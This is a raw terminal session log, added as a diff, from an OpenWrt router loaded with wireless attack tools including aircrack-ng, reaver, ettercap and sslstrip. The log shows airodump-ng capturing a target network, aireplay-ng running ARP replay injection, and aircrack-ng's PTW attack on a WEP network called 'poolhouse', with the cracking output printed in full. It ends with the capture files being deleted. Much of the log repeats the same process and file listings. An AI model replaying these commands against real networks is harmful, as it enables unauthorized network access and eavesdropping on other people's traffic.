+                              ignore the mismatch, needed for unpatched cfg80211
+
+  Attack modes (numbers can still be used):
+
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+Mem: 24728K used, 4484K free, 0K shrd, 2476K buff, 9296K cached
+CPU:   9% usr   0% sys   0% nic  90% idle   0% io   0% irq   0% sirq
+Load average: 0.01 0.04 0.05 1/47 1804
+  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
+ 1804  1608 root     R     1496   5%   9% top
+ 1773  1608 root     T     5040  17%   0% airodump-ng -c 11 --bssid E0:91:F5:FD
+ 1794  1608 root     T     2844  10%   0% aireplay-ng -3 -b E0:91:F5:FD:D7:E2 m
+  695     1 root     S     1524   5%   0% /sbin/netifd
+ 1608  1607 root     S     1508   5%   0% -ash
+  758   695 root     S     1508   5%   0% udhcpc -p /var/run/udhcpc-br-lan.pid
+  615     1 root     S     1508   5%   0% /sbin/syslogd -C16
+    1     0 root     S     1504   5%   0% init
+  500     1 root     S     1504   5%   0% init
+ 1604     1 root     S     1500   5%   0% /usr/sbin/ntpd -n -p 0.openwrt.pool.n
+ 1219     1 root     S     1500   5%   0% /sbin/watchdog -t 5 /dev/watchdog
+  617     1 root     S     1488   5%   0% /sbin/klogd
+ 1261     1 root     S     1424   5%   0% hostapd -P /var/run/wifi-phy0.pid -B
+ 1607  1548 root     S     1220   4%   0% /usr/sbin/dropbear -P /var/run/dropbe
+ 1548     1 root     S     1152   4%   0% /usr/sbin/dropbear -P /var/run/dropbe
+ 1566     1 root     S     1132   4%   0% /usr/sbin/uhttpd -f -h /www -r OpenWr
+ 1591     1 nobody   S      940   3%   0% /usr/sbin/dnsmasq -C /var/etc/dnsmasq
+  625     1 root     S      872   3%   0% /sbin/ubusd
+  619     1 root     S      860   3%   0% /sbin/hotplug2 --override --persisten
+  250     2 root     SW       0   0%   0% [kworker/0:1]
+@OpenWrt:/mnt/usb/usr/bin# ps: invalid option -- a
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) multi-call binary.
+
+Usage: ps 
+
+Show list of processes
+
+	w	Wide output
+
+@OpenWrt:/mnt/usb/usr/bin#   PID USER       VSZ STAT COMMAND
+    1 root      1504 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    5 root         0 SW   [kworker/u:0]
+    6 root         0 SW<  [khelper]
+   63 root         0 SW   [sync_supers]
+   65 root         0 SW   [bdi-default]
+   67 root         0 SW<  [kblockd]
+   96 root         0 SW   [kswapd0]
+  144 root         0 SW   [fsnotify_mark]
+  173 root         0 SW<  [ath79-spi]
+  184 root         0 SW   [mtdblock0]
+  189 root         0 SW   [mtdblock1]
+  194 root         0 SW   [mtdblock2]
+  199 root         0 SW   [mtdblock3]
+  204 root         0 SW   [mtdblock4]
+  209 root         0 SW   [mtdblock5]
+  250 root         0 SW   [kworker/0:1]
+  437 root         0 SWN  [jffs2_gcd_mtd3]
+  465 root         0 SW   [khubd]
+  475 root         0 SW   [scsi_eh_0]
+  476 root         0 SW   [usb-storage]
+  477 root         0 SW   [kworker/0:2]
+  478 root         0 SW   [kworker/u:2]
+  500 root      1504 S    init
+  535 root         0 SW<  [cfg80211]
+  615 root      1508 S    /sbin/syslogd -C16
+  617 root      1488 S    /sbin/klogd
+  619 root       860 S    /sbin/hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udev
+  625 root       872 S    /sbin/ubusd
+  672 root         0 SW   [jbd2/sda2-8]
+  673 root         0 SW<  [ext4-dio-unwrit]
+  695 root      1524 S    /sbin/netifd
+  758 root      1508 S    udhcpc -p /var/run/udhcpc-br-lan.pid -s /lib/netifd/dhcp.script -f -t 0 -i br-lan -r 192.168.1.1 -C
+ 1219 root      1500 S    /sbin/watchdog -t 5 /dev/watchdog
+ 1261 root      1424 S    hostapd -P /var/run/wifi-phy0.pid -B /var/run/hostapd-phy0.conf
+ 1548 root      1152 S    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1566 root      1132 S    /usr/sbin/uhttpd -f -h /www -r OpenWrt -x /cgi-bin -t 60 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
+ 1591 nobody     940 S    /usr/sbin/dnsmasq -C /var/etc/dnsmasq.conf
+ 1604 root      1500 S    /usr/sbin/ntpd -n -p 0.openwrt.pool.ntp.org -p 1.openwrt.pool.ntp.org -p 2.openwrt.pool.ntp.org -p 3.open
+ 1607 root      1220 R    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1608 root      1508 S    -ash
+ 1773 root      5040 T    airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+ 1794 root      2844 T    aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+ 1802 root         0 SW   [flush-8:0]
+ 1806 root      1496 R    ps
+@OpenWrt:/mnt/usb/usr/bin# -ash: frfg: not found
+@OpenWrt:/mnt/usb/usr/bin# -ash: fg: 1773: no such job
+@OpenWrt:/mnt/usb/usr/bin# [2]+  Stopped                    aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+[1]-  Stopped                    airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+@OpenWrt:/mnt/usb/usr/bin# aircrack-ng                 ivstools                    packetforge-ng              ssh
+airdecap-ng                 kismet_client               perl                        sshtunnel.sh
+airdecloak-ng               kismet_server               perl5.10.0                  sslstrip
+airpwn                      kstats                      python                      tar
+buddy-ng                    makeivs-ng                  python2.7                   twistd
+bzip2                       mktap                       reaver                      u2boat
+curl                        nmap                        replay_arp-0510-143428.cap  u2spewfoo
+daq-modules-config          openssl                     scp                         vim
+elinks                      output-01.cap               sed                         wash
+ettercap                    output-01.csv               sftp
+etterfilter                 output-01.kismet.csv        snort
+etterlog                    output-01.kismet.netxml     snort.bin
+@OpenWrt:/mnt/usb/usr/bin# -rwxr-xr-x    1 root     root         55448 May  9 00:52 aircrack-ng
+-rwxr-xr-x    1 root     root         20440 May  9 00:52 airdecap-ng
+-rwxr-xr-x    1 root     root         16872 May  9 00:52 airdecloak-ng
+-rwxr-xr-x    1 root     root         15016 May  9 00:53 airpwn
+-rwxr-xr-x    1 root     root          8456 May  9 00:52 buddy-ng
+-rwxr-xr-x    1 root     root         25056 May  8 23:42 bzip2
+-rwxr-xr-x    1 root     root         69312 May  8 23:50 curl
+-rwxr-xr-x    1 root     root           589 May  9 05:16 daq-modules-config
+-rwxr-xr-x    1 root     root        541576 May  9 03:16 elinks
+-rwxr-xr-x    1 root     root        217308 May  9 03:24 ettercap
+-rwxr-xr-x    1 root     root         33912 May  9 03:24 etterfilter
+-rwxr-xr-x    1 root     root         37980 May  9 03:24 etterlog
+-rwxr-xr-x    1 root     root         20744 May  9 00:52 ivstools
+-rwxr-xr-x    1 root     root        556120 May  9 05:00 kismet_client
+-rwxr-xr-x    1 root     root        671847 May  9 05:00 kismet_server
+-rwxr-xr-x    1 root     root          5544 May  9 00:52 kstats
+-rwxr-xr-x    1 root     root         13464 May  9 00:52 makeivs-ng
+-rwxr-xr-x    1 root     root           644 May  9 08:12 mktap
+-rwxr-xr-x    1 root     root       1969712 May  9 06:19 nmap
+-rwxr-xr-x    1 root     root        474752 May  8 23:33 openssl
+-rw-r--r--    1 root     root          9973 May 10 14:24 output-01.cap
+-rw-r--r--    1 root     root           477 May 10 14:24 output-01.csv
+-rw-r--r--    1 root     root           580 May 10 14:24 output-01.kismet.csv
+-rw-r--r--    1 root     root          2621 May 10 14:24 output-01.kismet.netxml
+-rwxr-xr-x    1 root     root         24776 May  9 00:52 packetforge-ng
+lrwxrwxrwx    1 root     root            10 May 10 01:22 perl -> perl5.10.0
+-rwxr-xr-x    1 root     root        816440 May  9 02:11 perl5.10.0
+lrwxrwxrwx    1 root     root             9 May 10 01:27 python -> python2.7
+-rwxr-xr-x    1 root     root        915352 May  9 01:23 python2.7
+-rwxr-xr-x    1 root     root        363640 May  9 07:40 reaver
+-rw-r--r--    1 root     root           126 May 10 14:34 replay_arp-0510-143428.cap
+-rwxr-xr-x    1 root     root         50236 May  9 06:58 scp
+-rwxr-xr-x    1 root     root         65016 May  9 07:52 sed
+-rwxr-xr-x    1 root     root         87428 May  9 06:58 sftp
+-rwxr-xr-x    1 root     root            53 May  9 08:01 snort
+-rwxr-xr-x    1 root     root        775432 May  9 08:01 snort.bin
+-rwxr-xr-x    1 root     root        565507 May  9 06:58 ssh
+-rwxr-xr-x    1 root     root           530 May  9 08:11 sshtunnel.sh
+-rwxr-xr-x    1 root     root          4066 May  9 08:12 sslstrip
+-rwxr-xr-x    1 root     root        206360 May  9 08:23 tar
+-rwxr-xr-x    1 root     root           660 May  9 08:12 twistd
+-rwxr-xr-x    1 root     root          5192 May  9 08:01 u2boat
+-rwxr-xr-x    1 root     root          8856 May  9 08:01 u2spewfoo
+-rwxr-xr-x    1 root     root        319304 May  9 08:40 vim
+-rwxr-xr-x    1 root     root        185468 May  9 07:40 wash
+@OpenWrt:/mnt/usb/usr/bin# -ash: repytr: not found
+@OpenWrt:/mnt/usb/usr/bin# -ash: aircrack-0aircrack-ng: not found
+@OpenWrt:/mnt/usb/usr/bin# Opening output-1.cap
+open failed: No such file or directory
+Read 0 packets.
+
+No networks found, exiting.
+
+
+Quitting aircrack-ng...
+@OpenWrt:/mnt/usb/usr/bin# Opening output-01.cap
+Read 97 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  E0:91:F5:FD:D7:E2  poolhouse                 WEP (20 IVs)
+
+Choosing first network as target.
+
+Opening output-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 20 ivs.
+
+
+                                                           Aircrack-ng 1.1
+
+
+                                           [00:00:53] Tested 1835009 keys (got 20 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  2   F0( 256) 7A( 256) A3( 256) 10( 256) DE( 256) 05( 256) 8C( 256) 2F( 256) 52( 256) D2( 256) 
+    1    0/  1   B1( 256) D7( 256) 5F( 256) CC( 256) 39( 256) 62( 256) 2E( 256) 14( 256) 08( 256) 09( 256) 
+    2    0/  1   8F( 512) 12( 256) 44( 256) 53( 256) F2( 256) 9C( 256) DB( 256) 57( 256) CD( 256) 35( 256) 
+    3    0/  1   48( 256) 51( 256) E5( 256) 07( 256) A5( 256) DA( 256) 8C( 256) EF( 256) 81( 256) 59( 256) 
+    4    0/  1   BD( 512) 5E( 256) 63( 256) 2B( 256) 1E( 256) C0( 256) E0( 256) 07( 256) 58( 256) 3E( 256) 
+    5    0/  1   42( 256) 0E( 256) 13( 256) B1( 256) 54( 256) CD( 256) D2( 256) B5( 256) FA( 256) 82( 256) 
+    6    0/  1   7B( 256) A1( 256) 52( 256) 7C( 256) F5( 256) 47( 256) 06( 256) 7F( 256) 81( 256) DF( 256) 
+    7    0/  1   BD( 512) 78( 256) A3( 256) 53( 256) 8E( 256) 98( 256) 0A( 256) FD( 256) 76( 256) 09( 256) 
+    8    0/  1   51( 256) F3( 256) 6C( 256) CC( 256) 61( 256) 62( 256) 7F( 256) 18( 256) 8E( 256) 6A( 256) 
+    9    0/  9   79( 256) F2( 256) D7( 256) 7C( 256) F5( 256) 3A( 256) 56( 256) A8( 256) 57( 256) 61( 256) 
+   10    0/  1   77( 256) 29( 256) 52( 256) CB( 256) 6E( 256) 55( 256) 13( 256) 57( 256) 4A( 256) 4B( 256) 
+   11    0/  1   28( 256) 01( 256) CB( 256) 38( 256) 61( 256) E8( 256) CF( 256) DC( 256) 3D( 256) 8F( 256) 
+   12    0/  1   8A( 476) 55( 256) 37( 256) 53( 256) 5C( 256) CE( 256) 2F( 256) B0( 256) 90( 256) C1( 256) 
+
+
+Quitting aircrack-ng...          : not found
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# Opening output-01.cap
+Read 97 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  E0:91:F5:FD:D7:E2  poolhouse                 WEP (20 IVs)
+
+Choosing first network as target.
+
+Opening output-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 20 ivs.
+
+
+
+
+
+
+
+
+                                                           Aircrack-ng 1.1
+
+
+                                           [00:00:21] Tested 720897 keys (got 20 IVs)
+
+   KB    depth   byte(vote)
+    0    0/ 12   F0( 256) 7A( 256) A3( 256) 10( 256) DE( 256) 05( 256) 8C( 256) 2F( 256) 52( 256) D2( 256) 
+    1    0/  1   36( 256) D7( 256) 5F( 256) CC( 256) 39( 256) 62( 256) 2E( 256) 14( 256) 08( 256) 09( 256) 
+    2    0/  1   8F( 512) 12( 256) 44( 256) 53( 256) F2( 256) 9C( 256) DB( 256) 57( 256) CD( 256) 35( 256) 
+    3    0/  1   48( 256) 51( 256) E5( 256) 07( 256) A5( 256) DA( 256) 8C( 256) EF( 256) 81( 256) 59( 256) 
+    4    0/  1   BD( 512) 5E( 256) 63( 256) 2B( 256) 1E( 256) C0( 256) E0( 256) 07( 256) 58( 256) 3E( 256) 
+    5    0/  1   42( 256) 0E( 256) 13( 256) B1( 256) 54( 256) CD( 256) D2( 256) B5( 256) FA( 256) 82( 256) 
+    6    0/  1   7B( 256) A1( 256) 52( 256) 7C( 256) F5( 256) 47( 256) 06( 256) 7F( 256) 81( 256) DF( 256) 
+    7    0/  1   BD( 512) 78( 256) A3( 256) 53( 256) 8E( 256) 98( 256) 0A( 256) FD( 256) 76( 256) 09( 256) 
+    8    0/  1   51( 256) F3( 256) 6C( 256) CC( 256) 61( 256) 62( 256) 7F( 256) 18( 256) 8E( 256) 6A( 256) 
+    9    0/  1   79( 256) F2( 256) D7( 256) 7C( 256) F5( 256) 3A( 256) 56( 256) A8( 256) 57( 256) 61( 256) 
+   10    0/  1   77( 256) 29( 256) 52( 256) CB( 256) 6E( 256) 55( 256) 13( 256) 57( 256) 4A( 256) 4B( 256) 
+   11    0/  1   28( 256) 01( 256) CB( 256) 38( 256) 61( 256) E8( 256) CF( 256) DC( 256) 3D( 256) 8F( 256) 
+   12    0/  1   B9( 476) 55( 256) 37( 256) 53( 256) 5C( 256) CE( 256) 2F( 256) B0( 256) 90( 256) C1( 256) 
+
+
+Quitting aircrack-ng...
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin#   PID USER       VSZ STAT COMMAND
+    1 root      1504 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    5 root         0 SW   [kworker/u:0]
+    6 root         0 SW<  [khelper]
+   63 root         0 SW   [sync_supers]
+   65 root         0 SW   [bdi-default]
+   67 root         0 SW<  [kblockd]
+   96 root         0 SW   [kswapd0]
+  144 root         0 SW   [fsnotify_mark]
+  173 root         0 SW<  [ath79-spi]
+  184 root         0 SW   [mtdblock0]
+  189 root         0 SW   [mtdblock1]
+  194 root         0 SW   [mtdblock2]
+  199 root         0 SW   [mtdblock3]
+  204 root         0 SW   [mtdblock4]
+  209 root         0 SW   [mtdblock5]
+  250 root         0 SW   [kworker/0:1]
+  437 root         0 SWN  [jffs2_gcd_mtd3]
+  465 root         0 SW   [khubd]
+  475 root         0 SW   [scsi_eh_0]
+  476 root         0 SW   [usb-storage]
+  477 root         0 SW   [kworker/0:2]
+  478 root         0 SW   [kworker/u:2]
+  500 root      1504 S    init
+  535 root         0 SW<  [cfg80211]
+  615 root      1508 S    /sbin/syslogd -C16
+  617 root      1488 S    /sbin/klogd
+  619 root       860 S    /sbin/hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udev
+  625 root       872 S    /sbin/ubusd
+  672 root         0 SW   [jbd2/sda2-8]
+  673 root         0 SW<  [ext4-dio-unwrit]
+  695 root      1524 S    /sbin/netifd
+  758 root      1508 S    udhcpc -p /var/run/udhcpc-br-lan.pid -s /lib/netifd/dhcp.script -f -t 0 -i br-lan -r 192.168.1.1 -C
+ 1219 root      1500 S    /sbin/watchdog -t 5 /dev/watchdog
+ 1261 root      1424 S    hostapd -P /var/run/wifi-phy0.pid -B /var/run/hostapd-phy0.conf
+ 1548 root      1152 S    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1566 root      1132 S    /usr/sbin/uhttpd -f -h /www -r OpenWrt -x /cgi-bin -t 60 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
+ 1591 nobody     940 S    /usr/sbin/dnsmasq -C /var/etc/dnsmasq.conf
+ 1604 root      1500 S    /usr/sbin/ntpd -n -p 0.openwrt.pool.ntp.org -p 1.openwrt.pool.ntp.org -p 2.openwrt.pool.ntp.org -p 3.open
+ 1607 root      1220 R    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1608 root      1508 S    -ash
+ 1773 root      5040 T    airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+ 1794 root      2844 T    aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+ 1802 root         0 SW   [flush-8:0]
+ 1820 root      1496 R    ps
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# [2]+  Killed                     aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+@OpenWrt:/mnt/usb/usr/bin# -ash: pws: not found
+[1]+  Killed                     airodump-ng -c 11 --bssid E0:91:F5:FD:D7:E2 -w output mon0
+@OpenWrt:/mnt/usb/usr/bin#   PID USER       VSZ STAT COMMAND
+    1 root      1504 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    5 root         0 SW   [kworker/u:0]
+    6 root         0 SW<  [khelper]
+   63 root         0 SW   [sync_supers]
+   65 root         0 SW   [bdi-default]
+   67 root         0 SW<  [kblockd]
+   96 root         0 SW   [kswapd0]
+  144 root         0 SW   [fsnotify_mark]
+  173 root         0 SW<  [ath79-spi]
+  184 root         0 SW   [mtdblock0]
+  189 root         0 SW   [mtdblock1]
+  194 root         0 SW   [mtdblock2]
+  199 root         0 SW   [mtdblock3]
+  204 root         0 SW   [mtdblock4]
+  209 root         0 SW   [mtdblock5]
+  250 root         0 SW   [kworker/0:1]
+  437 root         0 SWN  [jffs2_gcd_mtd3]
+  465 root         0 SW   [khubd]
+  475 root         0 SW   [scsi_eh_0]
+  476 root         0 SW   [usb-storage]
+  477 root         0 SW   [kworker/0:2]
+  478 root         0 SW   [kworker/u:2]
+  500 root      1504 S    init
+  535 root         0 SW<  [cfg80211]
+  615 root      1508 S    /sbin/syslogd -C16
+  617 root      1488 S    /sbin/klogd
+  619 root       860 S    /sbin/hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udev
+  625 root       872 S    /sbin/ubusd
+  672 root         0 SW   [jbd2/sda2-8]
+  673 root         0 SW<  [ext4-dio-unwrit]
+  695 root      1524 S    /sbin/netifd
+  758 root      1508 S    udhcpc -p /var/run/udhcpc-br-lan.pid -s /lib/netifd/dhcp.script -f -t 0 -i br-lan -r 192.168.1.1 -C
+ 1219 root      1500 S    /sbin/watchdog -t 5 /dev/watchdog
+ 1261 root      1424 S    hostapd -P /var/run/wifi-phy0.pid -B /var/run/hostapd-phy0.conf
+ 1548 root      1152 S    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1566 root      1132 S    /usr/sbin/uhttpd -f -h /www -r OpenWrt -x /cgi-bin -t 60 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
+ 1591 nobody     940 S    /usr/sbin/dnsmasq -C /var/etc/dnsmasq.conf
+ 1604 root      1500 S    /usr/sbin/ntpd -n -p 0.openwrt.pool.ntp.org -p 1.openwrt.pool.ntp.org -p 2.openwrt.pool.ntp.org -p 3.open
+ 1607 root      1220 R    /usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 22
+ 1608 root      1508 S    -ash
+ 1802 root         0 SW   [flush-8:0]
+ 1821 root      1496 R    ps
+@OpenWrt:/mnt/usb/usr/bin# @OpenWrt:/mnt/usb/usr/bin# Connection to 192.168.1.108 closed.
+agent@kali:~$ ssh root@192.168.1.108
+root@192.168.1.108's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# cd /mnt/usb
+root@OpenWrt:/mnt/usb# ls
+etc         lib         lost+found  sbin        usr
+root@OpenWrt:/mnt/usb# cd usr/bin
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng                 ivstools                    packetforge-ng              ssh
+airdecap-ng                 kismet_client               perl                        sshtunnel.sh
+airdecloak-ng               kismet_server               perl5.10.0                  sslstrip
+airpwn                      kstats                      python                      tar
+buddy-ng                    makeivs-ng                  python2.7                   twistd
+bzip2                       mktap                       reaver                      u2boat
+curl                        nmap                        replay_arp-0510-143428.cap  u2spewfoo
+daq-modules-config          openssl                     scp                         vim
+elinks                      output-01.cap               sed                         wash
+ettercap                    output-01.csv               sftp
+etterfilter                 output-01.kismet.csv        snort
+etterlog                    output-01.kismet.netxml     snort.bin
+root@OpenWrt:/mnt/usb/usr/bin# ls -l
+-rwxr-xr-x    1 root     root         55448 May  9 00:52 aircrack-ng
+-rwxr-xr-x    1 root     root         20440 May  9 00:52 airdecap-ng
+-rwxr-xr-x    1 root     root         16872 May  9 00:52 airdecloak-ng
+-rwxr-xr-x    1 root     root         15016 May  9 00:53 airpwn
+-rwxr-xr-x    1 root     root          8456 May  9 00:52 buddy-ng
+-rwxr-xr-x    1 root     root         25056 May  8 23:42 bzip2
+-rwxr-xr-x    1 root     root         69312 May  8 23:50 curl
+-rwxr-xr-x    1 root     root           589 May  9 05:16 daq-modules-config
+-rwxr-xr-x    1 root     root        541576 May  9 03:16 elinks
+-rwxr-xr-x    1 root     root        217308 May  9 03:24 ettercap
+-rwxr-xr-x    1 root     root         33912 May  9 03:24 etterfilter
+-rwxr-xr-x    1 root     root         37980 May  9 03:24 etterlog
+-rwxr-xr-x    1 root     root         20744 May  9 00:52 ivstools
+-rwxr-xr-x    1 root     root        556120 May  9 05:00 kismet_client
+-rwxr-xr-x    1 root     root        671847 May  9 05:00 kismet_server
+-rwxr-xr-x    1 root     root          5544 May  9 00:52 kstats
+-rwxr-xr-x    1 root     root         13464 May  9 00:52 makeivs-ng
+-rwxr-xr-x    1 root     root           644 May  9 08:12 mktap
+-rwxr-xr-x    1 root     root       1969712 May  9 06:19 nmap
+-rwxr-xr-x    1 root     root        474752 May  8 23:33 openssl
+-rw-r--r--    1 root     root          9973 May 10 14:24 output-01.cap
+-rw-r--r--    1 root     root           477 May 10 14:24 output-01.csv
+-rw-r--r--    1 root     root           580 May 10 14:24 output-01.kismet.csv
+-rw-r--r--    1 root     root          2621 May 10 14:24 output-01.kismet.netxml
+-rwxr-xr-x    1 root     root         24776 May  9 00:52 packetforge-ng
+lrwxrwxrwx    1 root     root            10 May 10 01:22 perl -> perl5.10.0
+-rwxr-xr-x    1 root     root        816440 May  9 02:11 perl5.10.0
+lrwxrwxrwx    1 root     root             9 May 10 01:27 python -> python2.7
+-rwxr-xr-x    1 root     root        915352 May  9 01:23 python2.7
+-rwxr-xr-x    1 root     root        363640 May  9 07:40 reaver
+-rw-r--r--    1 root     root           126 May 10 14:34 replay_arp-0510-143428.cap
+-rwxr-xr-x    1 root     root         50236 May  9 06:58 scp
+-rwxr-xr-x    1 root     root         65016 May  9 07:52 sed
+-rwxr-xr-x    1 root     root         87428 May  9 06:58 sftp
+-rwxr-xr-x    1 root     root            53 May  9 08:01 snort
+-rwxr-xr-x    1 root     root        775432 May  9 08:01 snort.bin
+-rwxr-xr-x    1 root     root        565507 May  9 06:58 ssh
+-rwxr-xr-x    1 root     root           530 May  9 08:11 sshtunnel.sh
+-rwxr-xr-x    1 root     root          4066 May  9 08:12 sslstrip
+-rwxr-xr-x    1 root     root        206360 May  9 08:23 tar
+-rwxr-xr-x    1 root     root           660 May  9 08:12 twistd
+-rwxr-xr-x    1 root     root          5192 May  9 08:01 u2boat
+-rwxr-xr-x    1 root     root          8856 May  9 08:01 u2spewfoo
+-rwxr-xr-x    1 root     root        319304 May  9 08:40 vim
+-rwxr-xr-x    1 root     root        185468 May  9 07:40 wash
+root@OpenWrt:/mnt/usb/usr/bin# cat output-01.
+cat: can't open 'output-01.': No such file or directory
+root@OpenWrt:/mnt/usb/usr/bin# cat output-01.cap
+3400�<�	��P���'�BC^b2/��L3|����L4
+                                                                                                      root@OpenWrt:/mnt/usb/usr/bin# 
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng                 ivstools                    packetforge-ng              ssh
+airdecap-ng                 kismet_client               perl                        sshtunnel.sh
+airdecloak-ng               kismet_server               perl5.10.0                  sslstrip
+airpwn                      kstats                      python                      tar
+buddy-ng                    makeivs-ng                  python2.7                   twistd
+bzip2                       mktap                       reaver                      u2boat
+curl                        nmap                        replay_arp-0510-143428.cap  u2spewfoo
+daq-modules-config          openssl                     scp                         vim
+elinks                      output-01.cap               sed                         wash
+ettercap                    output-01.csv               sftp
+etterfilter                 output-01.kismet.csv        snort
+etterlog                    output-01.kismet.netxml     snort.bin
+root@OpenWrt:/mnt/usb/usr/bin# ls -l
+-rwxr-xr-x    1 root     root         55448 May  9 00:52 aircrack-ng
+-rwxr-xr-x    1 root     root         20440 May  9 00:52 airdecap-ng
+-rwxr-xr-x    1 root     root         16872 May  9 00:52 airdecloak-ng
+-rwxr-xr-x    1 root     root         15016 May  9 00:53 airpwn
+-rwxr-xr-x    1 root     root          8456 May  9 00:52 buddy-ng
+-rwxr-xr-x    1 root     root         25056 May  8 23:42 bzip2
+-rwxr-xr-x    1 root     root         69312 May  8 23:50 curl
+-rwxr-xr-x    1 root     root           589 May  9 05:16 daq-modules-config
+-rwxr-xr-x    1 root     root        541576 May  9 03:16 elinks
+-rwxr-xr-x    1 root     root        217308 May  9 03:24 ettercap
+-rwxr-xr-x    1 root     root         33912 May  9 03:24 etterfilter
+-rwxr-xr-x    1 root     root         37980 May  9 03:24 etterlog
+-rwxr-xr-x    1 root     root         20744 May  9 00:52 ivstools
+-rwxr-xr-x    1 root     root        556120 May  9 05:00 kismet_client
+-rwxr-xr-x    1 root     root        671847 May  9 05:00 kismet_server
+-rwxr-xr-x    1 root     root          5544 May  9 00:52 kstats
+-rwxr-xr-x    1 root     root         13464 May  9 00:52 makeivs-ng
+-rwxr-xr-x    1 root     root           644 May  9 08:12 mktap
+-rwxr-xr-x    1 root     root       1969712 May  9 06:19 nmap
+-rwxr-xr-x    1 root     root        474752 May  8 23:33 openssl
+-rw-r--r--    1 root     root          9973 May 10 14:24 output-01.cap
+-rw-r--r--    1 root     root           477 May 10 14:24 output-01.csv
+-rw-r--r--    1 root     root           580 May 10 14:24 output-01.kismet.csv
+-rw-r--r--    1 root     root          2621 May 10 14:24 output-01.kismet.netxml
+-rwxr-xr-x    1 root     root         24776 May  9 00:52 packetforge-ng
+lrwxrwxrwx    1 root     root            10 May 10 01:22 perl -> perl5.10.0
+-rwxr-xr-x    1 root     root        816440 May  9 02:11 perl5.10.0
+lrwxrwxrwx    1 root     root             9 May 10 01:27 python -> python2.7
+-rwxr-xr-x    1 root     root        915352 May  9 01:23 python2.7
+-rwxr-xr-x    1 root     root        363640 May  9 07:40 reaver
+-rw-r--r--    1 root     root           126 May 10 14:34 replay_arp-0510-143428.cap
+-rwxr-xr-x    1 root     root         50236 May  9 06:58 scp
+-rwxr-xr-x    1 root     root         65016 May  9 07:52 sed
+-rwxr-xr-x    1 root     root         87428 May  9 06:58 sftp
+-rwxr-xr-x    1 root     root            53 May  9 08:01 snort
+-rwxr-xr-x    1 root     root        775432 May  9 08:01 snort.bin
+-rwxr-xr-x    1 root     root        565507 May  9 06:58 ssh
+-rwxr-xr-x    1 root     root           530 May  9 08:11 sshtunnel.sh
+-rwxr-xr-x    1 root     root          4066 May  9 08:12 sslstrip
+-rwxr-xr-x    1 root     root        206360 May  9 08:23 tar
+-rwxr-xr-x    1 root     root           660 May  9 08:12 twistd
+-rwxr-xr-x    1 root     root          5192 May  9 08:01 u2boat
+-rwxr-xr-x    1 root     root          8856 May  9 08:01 u2spewfoo
+-rwxr-xr-x    1 root     root        319304 May  9 08:40 vim
+-rwxr-xr-x    1 root     root        185468 May  9 07:40 wash
+root@OpenWrt:/mnt/usb/usr/bin# rm -rf output-01.*
+root@OpenWrt:/mnt/usb/usr/bin# ls
+aircrack-ng                 etterlog                    perl5.10.0                  sshtunnel.sh
+airdecap-ng                 ivstools                    python                      sslstrip
+airdecloak-ng               kismet_client               python2.7                   tar
+airpwn                      kismet_server               reaver                      twistd
+buddy-ng                    kstats                      replay_arp-0510-143428.cap  u2boat
+bzip2                       makeivs-ng                  scp                         u2spewfoo
+curl                        mktap                       sed                         vim
+daq-modules-config          nmap                        sftp                        wash
+elinks                      openssl                     snort
+ettercap                    packetforge-ng              snort.bin
+etterfilter                 perl                        ssh
